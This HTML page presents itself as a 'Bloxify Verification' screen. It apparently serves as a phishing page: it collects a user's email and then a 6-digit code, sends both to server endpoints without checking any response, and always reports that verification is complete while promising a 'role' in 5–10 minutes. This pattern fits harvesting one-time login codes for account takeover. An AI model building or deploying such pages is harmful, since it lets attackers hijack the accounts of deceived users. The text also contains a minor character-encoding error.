<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>

<style>
* {
    box-sizing: border-box;
}

html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    background: black;
    font-family: Arial, sans-serif;
    overflow: hidden;
}

/* STAR LAYER */
#stars {
    position: fixed;
    inset: 0;
    pointer-events: none;
}

/* UI CENTERING (THIS CANNOT BREAK) */
body {
    display: flex;
    align-items: center;
    justify-content: center;
}

/* CARD */
#box {
    width: 420px;
    padding: 36px;
    background: #111;
    border-radius: 14px;
    box-shadow: 0 0 40px rgba(0,0,0,0.8);
    text-align: center;
    z-index: 2;
}

h1 {
    color: #eee;
    margin: 0 0 8px 0;
}

p {
    color: #aaa;
    font-size: 14px;
    margin-bottom: 16px;
}

input {
    width: 100%;
    padding: 14px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    background: #1c1c1c;
    color: white;
}

button {
    width: 100%;
    padding: 14px;
    margin-top: 14px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    background: #2a2a2a;
    color: white;
    cursor: pointer;
}

button:hover {
    background: #3a3a3a;
}
</style>
</head>

<body>

<canvas id="stars"></canvas>

<div id="box">
    <h1>Bloxify Verification</h1>
    <p id="desc">Enter your email to begin verification.</p>

    <input id="input" placeholder="Email address">
    <button onclick="submit()">Submit</button>
</div>

<script>
/* ===== MOVING STARS (SLOW, CLEAN) ===== */
const canvas = document.getElementById("stars");
const ctx = canvas.getContext("2d");

let w, h;
function resize() {
    w = canvas.width = window.innerWidth;
    h = canvas.height = window.innerHeight;
}
window.addEventListener("resize", resize);
resize();

const stars = Array.from({ length: 120 }, () => ({
    x: Math.random() * w,
    y: Math.random() * h,
    vx: 0.05 + Math.random() * 0.1,
    vy: 0.05 + Math.random() * 0.1,
    r: Math.random() * 1.5 + 0.5
}));

function animate() {
    ctx.clearRect(0, 0, w, h);
    ctx.fillStyle = "white";

    for (const s of stars) {
        s.x += s.vx;
        s.y += s.vy;

        if (s.x > w) s.x = 0;
        if (s.y > h) s.y = 0;

        ctx.beginPath();
        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
        ctx.fill();
    }

    requestAnimationFrame(animate);
}
animate();

/* ===== UI FLOW ===== */
let step = "email";

function submit() {
    const value = input.value.trim();
    if (!value) return;

    if (step === "email") {
        fetch("/email", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ email: value })
        });

        input.value = "";
        input.placeholder = "6-digit code";
        desc.innerText = "Enter the verification code.";
        step = "code";

    } else {
        fetch("/code", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ code: value })
        });

        box.innerHTML = `
            <h1>Verification Complete</h1>
            <p>Please wait 5â€“10 minutes to receive your role.</p>
        `;
    }
}
</script>

</body>
</html>
